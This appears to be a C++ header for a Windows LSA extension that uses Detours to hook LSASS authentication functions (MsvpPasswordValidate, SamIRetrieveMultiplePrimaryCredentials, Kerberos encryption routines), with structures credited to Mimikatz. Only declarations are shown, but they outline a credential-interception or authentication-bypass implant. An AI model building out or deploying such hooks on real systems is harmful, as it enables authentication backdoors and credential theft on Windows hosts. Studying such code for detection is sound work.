#pragma once
#define SECURITY_WIN32
#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <SubAuth.h>
#include <iostream>
#include <fstream>
#include <string>
#include "detours.h"

namespace RAII
{
	class Library
	{
	public:
		Library(std::wstring input);
		~Library();
		HMODULE GetHandle();

	private:
		HMODULE _libraryHandle;
	};

	class Handle
	{
	public:
		Handle(HANDLE input);
		~Handle();
		HANDLE GetHandle();

	private:
		HANDLE _handle;
	};
}

bool InstallHook();

#define STATUS_DS_NO_ATTRIBUTE_OR_VALUE  ((NTSTATUS)0xC00002A1L)

enum LSA_EXTENSION_INIT_STAGE
{
	LsaExtensionLoad = 1,    // After InitializeLsaExtension(0) inside LsapLoadExtension()
	LsaExtensionNotify = 2,  // After InitializeLsaExtension(1) inside LsapNotifyExtensionsLoadComplete()
	LsaExtensionStart = 3    // After InitializeLsaExtension(2) inside LsapStartExtensions()
};

// TAKEN FROM MIMIKATZ
typedef NTSTATUS(WINAPI* PKERB_ECRYPT_INITIALIZE) (LPCVOID pbKey, ULONG KeySize, ULONG MessageType, PVOID* pContext);
typedef NTSTATUS(WINAPI* PKERB_ECRYPT_ENCRYPT) (PVOID pContext, LPCVOID pbInput, ULONG cbInput, PVOID pbOutput, ULONG* cbOutput);
typedef NTSTATUS(WINAPI* PKERB_ECRYPT_DECRYPT) (PVOID pContext, LPCVOID pbInput, ULONG cbInput, PVOID pbOutput, ULONG* cbOutput);
typedef NTSTATUS(WINAPI* PKERB_ECRYPT_FINISH) (PVOID* pContext);
typedef NTSTATUS(WINAPI* PKERB_ECRYPT_HASHPASSWORD_NT5) (PUNICODE_STRING Password, PVOID pbKey);
typedef NTSTATUS(WINAPI* PKERB_ECRYPT_HASHPASSWORD_NT6) (PUNICODE_STRING Password, PUNICODE_STRING Salt, ULONG Count, PVOID pbKey);
typedef NTSTATUS(WINAPI* PKERB_ECRYPT_RANDOMKEY) (LPCVOID Seed, ULONG SeedLength, PVOID pbKey);
typedef NTSTATUS(WINAPI* PKERB_ECRYPT_CONTROL) (ULONG Function, PVOID pContext, PUCHAR InputBuffer, ULONG InputBufferSize);

typedef struct _KERB_ECRYPT {
	ULONG EncryptionType;
	ULONG BlockSize;
	ULONG ExportableEncryptionType;
	ULONG KeySize;
	ULONG HeaderSize;
	ULONG PreferredCheckSum;
	ULONG Attributes;
	PCWSTR Name;
	PKERB_ECRYPT_INITIALIZE Initialize;
	PKERB_ECRYPT_ENCRYPT Encrypt;
	PKERB_ECRYPT_DECRYPT Decrypt;
	PKERB_ECRYPT_FINISH Finish;
	union {
		PKERB_ECRYPT_HASHPASSWORD_NT5 HashPassword_NT5;
		PKERB_ECRYPT_HASHPASSWORD_NT6 HashPassword_NT6;
	};
	PKERB_ECRYPT_RANDOMKEY RandomKey;
	PKERB_ECRYPT_CONTROL Control;
	PVOID unk0_null;
	PVOID unk1_null;
	PVOID unk2_null;
} KERB_ECRYPT, * PKERB_ECRYPT;
// TAKEN FROM MIMIKATZ

typedef BOOLEAN(WINAPI* pMsvpPasswordValidate)(BOOLEAN, NETLOGON_LOGON_INFO_CLASS, PVOID, void*, PULONG, PUSER_SESSION_KEY, PVOID);
extern pMsvpPasswordValidate MsvpPasswordValidate;
typedef NTSTATUS(WINAPI* pCDLocateCSystem)(ULONG Type, PKERB_ECRYPT* ppCSystem);
extern pCDLocateCSystem CDLocateCSystem;
typedef NTSTATUS(WINAPI* pSamIRetrieveMultiplePrimaryCredentials)(unsigned int UserHandle, unsigned int nPackages, PUNICODE_STRING PackageNames, unsigned int Credentials);
extern pSamIRetrieveMultiplePrimaryCredentials SamIRetrieveMultiplePrimaryCredentials;
extern PKERB_ECRYPT_INITIALIZE KERB_ECRYPT_INITIALIZE;
extern PKERB_ECRYPT_DECRYPT KERB_ECRYPT_DECRYPT;

BOOLEAN HookMSVPPValidate
(
	BOOLEAN UasCompatibilityRequired,
	NETLOGON_LOGON_INFO_CLASS LogonLevel,
	PVOID LogonInformation,
	void* Passwords,
	PULONG UserFlags,
	PUSER_SESSION_KEY UserSessionKey,
	PVOID LmSessionKey
);

NTSTATUS HookCDLocateCSystem
(
	ULONG Type,
	PKERB_ECRYPT* ppCSystem
);

NTSTATUS HookSamIRetrieveMultiplePrimaryCredentials
(
	unsigned int UserHandle,
	unsigned int nPackages,
	PUNICODE_STRING PackageNames,
	unsigned int Credentials
);

NTSTATUS HookInitialize
(
	LPCVOID pbKey,
	ULONG KeySize,
	ULONG MessageType,
	PVOID* pContext
);

NTSTATUS HookDecrypt
(
	PVOID pContext,
	LPCVOID pbInput,
	ULONG cbInput,
	PVOID pbOutput,
	ULONG* cbOutput
);